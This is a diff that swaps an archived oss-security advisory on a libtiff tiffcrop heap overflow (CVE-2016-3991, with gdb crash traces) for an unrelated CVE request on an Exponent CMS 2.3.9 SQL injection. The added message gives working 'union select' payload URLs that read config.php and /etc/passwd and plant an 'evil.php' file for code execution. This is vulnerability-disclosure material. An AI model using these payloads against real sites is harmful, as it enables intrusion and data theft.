@@ -1,127 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/12/3
-Message-ID: <5EDB84F4B23F5B4DB6500A89258280E0B9BCEB@EX02.corp.qihoo.net>
-Date: Tue, 12 Apr 2016 07:23:45 +0000
-From: 张开翔 <zhangkaixiang@....cn>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: CVE-2016-3991 : out-of-bounds write in loadImage() in tiffcrop tool
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/18/1
+Message-ID: <CAEiFw0WYE5q8jTO5napPQRKuGfnm1Q-VHg_ioEsKN6PX6Lxdnw@mail.gmail.com>
+Date: Sun, 18 Sep 2016 11:52:58 +0800
+From: felix k3y <felixk3y@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request：Exponent CMS 2.3.9 SQL injection vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Details
+Hi , I reported the following SQL Injection vulnerability to the
+ExponentCMS team on Sep 15, 2016:
 
-============
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/pixidou/controllers/pixidouController.php#L83-L91
+The "fid" parameter fail to sufficiently sanitize before using it in an SQL
+query, In This vulnerability, also lead to  Directory traversal、Remote code
+execution vulnerabilities etc..
 
-Product: libtiff
+1) Directory traversal vulnerability
+http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
+union select
+1,'./','1.txt',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../framework/conf/config.php
 
-Affected Versions: <= 4.0.6
+2) Remote code execution
+ i. Upload any legal files through website(.jpg|.gif etc..)
+ ii. copy file to evil file(.php etc..)
 
-CVE ID: CVE-2016-3991
+Proof of concept:
+http://www.exponentcms.org/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1'
+union select
+1,'./','evil.php',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../../../../../../../etc/passwd
 
-Tested system: CentOS Linux release 7.1.1503 64bit
+And Now, The SQL Injection vulnerability have been fixed.
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/c1092f167cc6c78dc8bf9bf149946c5219413df3
+https://github.com/exponentcms/exponent-cms/commit/c1092f167cc6c78dc8bf9bf149946c5219413df3
 
-Vulnerability Type: out-of-bounds write
-Vendor URL: http://www.remotesensing.org/libtiff/
+Has a CVE been assigned to this issue already? if not I request that
+one is assigned.
 
-Credit: Kaixiang Zhang of the Cloud Security Team, Qihoo 360
+thx.
+--------------------------------------
+penghua # silence.com.cn
+PKAV Team
 
-
-
-Introduction
-
-============
-
-An Out-of-bounds write caused by heap overflow when using tiffcrop tool, the vuln is in loadImage() function in tiffcrop.c. loadImage() will read the numbers of tiles by calling TIFFNumberOfTiles().
-
-However, if the numbers of tiles is 0, loadImage() will still read tile data by calling readContigTilesIntoBuffer() from the image, regardless of the numbers. In that case, loadImage() will allocate 3 bytes
-
-heap to store a tile data, heap overflow occurs if a tile data beyond 3 bytes, and the coverd memory could be controled. It will cause denial-of-service or may command excution when freeing
-
-the coverd heap memory..
-
-
-Source info
-
-============
-5941    readunit = TILE;
-5942    tlsize = TIFFTileSize(in);
-5943    ntiles = TIFFNumberOfTiles(in);
-5944    TIFFGetField(in, TIFFTAG_TILEWIDTH, &tw);
-5945    TIFFGetField(in, TIFFTAG_TILELENGTH, &tl);
-
-5947    tile_rowsize  = TIFFTileRowSize(in);
-5948       buffsize = tlsize * ntiles;
-… …
-6015       if (!read_buff)
-6016              read_buff = (unsigned char *)_TIFFmalloc(buffsize+3);
-… …
-6071       if (!(readContigTilesIntoBuffer(in, read_buff, length, width, tw, tl, spp, bps)))
-6072       {
-6073              TIFFError("loadImage", "Unable to read contiguous tiles into buffer");
-6074              return (-1);
-6075       }
-
-
-
-Debug info
-
-============
-gdb  --args  tiffcrop  _TIFFfree.tif  src1.tif tmpout.tif
-……
-(gdb) b tif_dirread.c:4758
-(gdb) c
-
-Breakpoint 1, TIFFFetchNormalTag (tif=tif@...ry=0x80aa008, dp=dp@...ry=0x80aa42c, recover=recover@...ry=1) at tif_dirread.c:4758
-4758                                                                           o=_TIFFmalloc((uint32)dp->tdir_count+1);
-(gdb) n
-4759                                                                 if (o==NULL)
-(gdb) p o
-$9 = (uint8 *) 0x80aa7e0 ""
-(gdb)b tif_dirread.c:1917
-(gdb) c
-Continuing.
-
-Breakpoint 2, TIFFReadDirEntryLong8Array (tif=tif@...ry=0x80aa008, direntry=0x80aa454, value=value@...ry=0xbfff984c) at tif_dirread.c:1917
-1917                   data=(uint64*)_TIFFmalloc(count*8);
-(gdb) n
-1918                   if (data==0)
-(gdb) p data
-$13 = (uint64 *) 0x80aa800
-(gdb) b tif_unix.c:340
-(gdb) c
-
-Breakpoint 3, _TIFFmemcpy (d=0x80aa7e0, s=0x80aa800, c=1088) at tif_unix.c:340
-340            memcpy(d, s, (size_t) c);
-(gdb) x/16xw d
-0x80aa7e0:      0x00000000     0xb7d917b8     0x00000010     0x00000011
-0x80aa7f0:       0x00000001     0x00000000     0x00000000     0x00000449
-0x80aa800:      0x00000000     0xb7d918f0      0x00000010     0x00000138
-0x80aa810:      0xa0002a49     0x80000000     0x3850e03f      0x20860924
-(gdb) finish
-(gdb) x/16xw 0x80aa7e0
-0x80aa7e0:      0x00000000     0xb7d918f0      0x00000010     0x00000138
-0x80aa7f0:       0xa0002a49     0x80000000     0x3850e03f      0x20860924
-0x80aa800:      0x83d0bf00      0x000207e1     0xe1bf2a00      0xfd9bf78f
-0x80aa810:      0x440050f8      0x89c2afe2      0x8d029f44      0x488063c7
-
-(gdb) c
-Continuing.
-Program received signal SIGSEGV, Segmentation fault.
-0xb7c3f6d7 in __GI___libc_free (mem=0x80aa800) at malloc.c:2968
-2968           ar_ptr = arena_for_chunk (p);
-(gdb) bt
-#0  0xb7c3f6d7 in __GI___libc_free (mem=0x80aa800) at malloc.c:2968
-#1  0xb7faa8f8 in _TIFFfree (p=0x80aa800) at tif_unix.c:322
-#2  0x0807d54c in readContigTilesIntoBuffer (in=in@...ry=0x80aa008, buf=buf@...ry=0x80aa7e0 "", imagelength=65536, imagewidth=544, tw=544, tl=1, spp=1, bps=16) at tiffcrop.c:830
-#3  0x0804fe00 in loadImage (read_ptr=0xbfff9ab8, dump=0xbfffd2b4, image=0xbfff9aec, in=<optimized out>) at tiffcrop.c:6071
-#4  main (argc=4, argv=0xbffff394) at tiffcrop.c:2278
-
-
-References:
-[1] http://www.remotesensing.org/libtiff/
-
-
-Thank you!
-
-Best Regards,
-Kaixiang Zhang
---- ---
